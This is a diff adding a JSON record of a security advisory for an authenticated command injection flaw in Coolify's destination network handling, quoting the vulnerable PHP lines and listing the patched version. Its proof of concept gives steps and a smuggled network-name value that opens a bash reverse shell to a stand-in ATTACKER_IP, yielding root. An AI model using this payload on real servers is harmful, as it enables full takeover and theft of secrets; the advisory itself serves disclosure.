@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-mf8p-rj62-9f9m",
+  "repo": {
+    "cve_id": "CVE-2026-34594",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nAn authenticated command injection vulnerability in the Destination Network Management functionality allows users with destination management permissions to execute arbitrary commands as root on managed servers. The \"network\" parameter is passed directly to shell commands without proper sanitization, enabling full remote code execution on the host system.\r\n\r\n### Details\r\n**Vulnerable File:** app/Livewire/Destination/Show.php\r\n**Lines:** 87-88 (delete function):\r\n```php\r\ninstant_remote_process([\"docker network disconnect {$this->destination->network} coolify-proxy\"], $this->destination->server, throwError: false);\r\ninstant_remote_process(['docker network rm -f '.$this->destination->network], $this->destination->server);\r\n```\r\n\r\nThe `network` parameter is captured in `app/Livewire/Destination/Show.php` via Livewire input without shell character validation. During deletion, it is directly interpolated in `docker network disconnect {$this->destination->network} coolify-proxy` and `docker network rm -f {$this->destination->network}`, leading to arbitrary command execution.\r\n\r\n### PoC\r\n**Prerequisites:**\r\n\r\n- Coolify v4.0.0-beta.470 or earlier\r\n- Authenticated user with destination management permissions\r\n\r\n**Steps to reproduce:**\r\n\r\n1. Start a netcat listener on attacker machine:\r\n```\r\nnc -lvp 4444\r\n```\r\n2. Log into the Coolify and navigate to the \"Destinations\"\r\n3. Click \"+ Add\" and modify the \"Network\" to the following:\r\n```\r\npoc; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 #\r\n```\r\n4. Click \"Continue\"\r\n5. After the destination created, click \"Delete Destination\"\r\n6. Enter the correct \"Destination Name\" to confirm action and click \"Permanently Delete\"\r\n7. A root shell is received on the attacker's listener:\r\n```\r\nid\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\n### Impact\r\n\r\n- Remote Code Execution: Attackers can execute arbitrary commands on managed servers\r\n- Root Privilege: All commands execute as root due to Coolify's sudo injection mechanism\r\n- Full Server Compromise: Attackers gain complete control of managed infrastructure\r\n- Tainted Data: Any subsequent command execution that processes this unsanitized network data is vulnerable to manipulation.\r\n- Lateral Movement: Compromised servers can be used to attack other managed resources\r\n- Data Breach: Access to all applications, databases, and secrets managed by Coolify\r\n",
+    "ghsa_id": "GHSA-mf8p-rj62-9f9m",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-mf8p-rj62-9f9m",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-mf8p-rj62-9f9m"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34594"
+      }
+    ],
+    "published_at": "2026-06-25T15:25:07Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Destination Network Management",
+    "updated_at": "2026-06-25T15:25:07Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "v4.0.0-beta.471",
+        "vulnerable_version_range": "<= v4.0.0-beta.470 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
